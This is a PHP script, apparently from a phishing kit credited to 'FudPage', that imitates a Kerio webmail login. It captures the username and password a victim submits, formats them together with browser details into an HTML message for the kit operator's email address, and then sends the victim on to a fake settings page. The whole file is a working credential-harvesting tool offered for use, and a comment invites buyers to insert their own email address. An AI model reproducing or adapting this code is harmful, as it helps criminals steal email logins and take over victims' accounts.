<?php
$data=  explode('@',$_POST["kerio_username"]);
    $Host = 'http://'.$data[1];
	$data2 = explode('.',$Host);
	$HostSub = $data[1];
/* =============(っ◔◡◔)っ ♥ CODED BY FudPage ♥========== */
...
$email = $_POST['kerio_username'];
$pass = $_POST['kerio_password'];
$domain = $_POST['domain'];


/* ====【Ｃｈａｎｇｅ　Ｙｏｕｒ　Ｅｍａｉｌ　Ｂｅｌｏｗ】=========== */
$own = 'jindle@protonmail.com';
/* ====【Ｊｕｓｔ　Ｃｈａｎｇｅ　Ｙｏｕｒ　Ｅｍａｉｌ．　Ｎｏｔ　Ｔｏｕｃｈ　Ａｎｙｔｈｉｎｇ】===== */
...
$over = '';
$msg = "<HTML><BODY><TABLE>
 <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>Burhan Fudpage<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>_________</td></tr>
 ...
 <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>Burhan<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>__________</td></tr>
 <tr><td>User-Agent: '$browser' 
 <br />URL: http://$web$inj </td></tr>
 <tr><td><b> *Fudpage* :</b> </td></tr>
 </BODY>
 </HTML>";
...
header("Location: Settings.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&Host=$Host&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
